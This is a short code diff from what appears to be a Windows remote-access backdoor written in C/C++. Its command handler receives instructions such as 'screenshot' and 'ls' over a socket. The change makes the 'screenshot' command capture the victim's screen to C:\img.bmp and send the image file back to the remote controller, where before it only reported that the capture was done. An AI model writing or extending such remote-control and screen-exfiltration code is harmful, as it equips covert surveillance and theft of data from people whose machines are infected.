@@ -16,6 +16,7 @@
 #include <stdlib.h>
 #include <intrin.h>
 #include <string>
+#include <iostream>
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -71,7 +72,8 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
 
   } else if (cmd == "screenshot") {
     char *ss = utils::TakeScreenShot((char*)"C:\\img.bmp");
-    net::write(&sock, "{\"screenshot\": \"done\"}");
+    net::sendFile(&sock, (char*)"sshot.bmp", (char*)"C:\\img.bmp");
+    // net::write(&sock, "{\"screenshot\": \"done\"}");
 
   } else if (cmd == "ls") {
     struct fs::s_folder folder;
